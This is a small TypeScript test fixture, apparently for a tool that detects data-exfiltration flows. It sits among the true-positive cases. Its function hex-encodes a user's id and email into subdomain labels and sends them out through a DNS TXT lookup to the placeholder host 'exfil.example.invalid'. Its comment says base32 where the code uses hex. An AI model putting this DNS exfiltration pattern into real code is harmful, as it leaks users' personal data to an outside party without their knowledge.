// true-positive-02: CHARTER edge case — base32-chunked subdomain with
// resolveTxt (TXT record exfil variant). Multiple template-literal
// interpolations, each a separate propagation hop.

import * as dns from "dns";

function leakUserData(user: { id: string; email: string }) {
  const chunk1 = Buffer.from(user.id).toString("hex");
  const chunk2 = Buffer.from(user.email).toString("hex");
  dns.resolveTxt(`${chunk1}.${chunk2}.exfil.example.invalid`, () => {});
}

leakUserData({ id: "abc", email: "x@y.z" });
